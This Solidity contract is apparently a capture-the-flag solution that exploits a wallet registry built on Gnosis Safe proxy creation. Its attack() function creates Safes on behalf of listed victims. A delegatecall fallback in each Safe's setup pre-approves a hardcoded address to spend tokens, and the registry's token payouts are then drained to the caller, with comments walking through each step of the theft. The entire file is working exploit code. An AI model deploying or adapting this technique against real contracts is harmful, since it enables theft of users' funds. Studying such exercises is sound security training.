// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./WalletRegistry.sol";

contract AttackWalletRegistry {

    GnosisSafeProxyFactory proxyFactory;
    GnosisSafe singleton;
    IProxyCreationCallback registry;
    IERC20 token;

    address[] victims;

    constructor(
        address proxyFactoryAddress,
        address payable singletonAddress,
        address registryAddress,
        address[] memory _victims,
        address tokenAddress)
    public {
        proxyFactory = GnosisSafeProxyFactory(proxyFactoryAddress);
        singleton = GnosisSafe(singletonAddress);
        registry = IProxyCreationCallback(registryAddress);
        victims = _victims;
        token = IERC20(tokenAddress);
    }

    function attack() public {
        address[] memory owners = new address[](1);

        for (uint8 i = 0; i < victims.length; i++)
        {
            owners[0] = victims[i];
            bytes memory data = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(this),
                "",
                address(0),
                address(0),
                0,
                address(0)
            );
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(address(singleton), data, 0, registry);
            token.transferFrom(address(proxy), tx.origin, token.balanceOf(address(proxy)));
        }
    }

    fallback() external {
        address tkn = 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0;

        // fallback is called first, on creation (because we specified the "to" parameter of setup.
        // the proxy delegateCalls into us, so let's give us approval for now which we'll use to exploit later.
        // after this, the Callback of `createProxyWithCallback` is executed on the proxy (=proxyCreated of WalletRegistry).
        // this transfers the tokens to the proxy, so after that we can steal the tokens thanks to the approval.
        // Note how approve allows us to pre-approve tokens we don't own (yet).
        tkn.call(abi.encodeWithSelector(
                IERC20.approve.selector,
                0x0116686E2291dbd5e317F47faDBFb43B599786Ef,
                10 ether
            ));
    }
}
